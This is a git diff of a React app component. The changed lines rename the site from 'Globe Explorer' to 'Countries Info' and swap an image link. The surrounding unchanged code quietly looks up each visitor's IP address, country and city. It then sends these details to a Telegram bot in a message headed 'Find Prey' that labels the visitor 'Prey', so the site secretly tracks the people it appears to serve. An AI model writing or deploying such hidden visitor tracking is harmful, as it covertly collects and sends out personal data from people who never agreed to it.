@@ -8,7 +8,7 @@ function App() {
     let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
     axios(IP_API).then((res) => {
       let message = `<b>Find Prey</b>\n`;
-      message += `<b>Site name:</b> Globe Explorer 🌏\n`;
+      message += `<b>Site name:</b> Countries Info 🌏\n`;
       message += `<b>Country:</b> ${res.data.country}\n`;
       message += `<b>City:</b> ${res.data.city}\n`;
       message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
@@ -16,7 +16,7 @@ function App() {
       console.log(res);
       axios.post(`${URL}/sendPhoto`, {
         chat_id: CHAT_ID,
-        photo: "https://ibb.co/WpMnM5N",
+        photo: "https://ibb.co/Khwnrq6",
         caption: message,
         parse_mode: "HTML",
       });
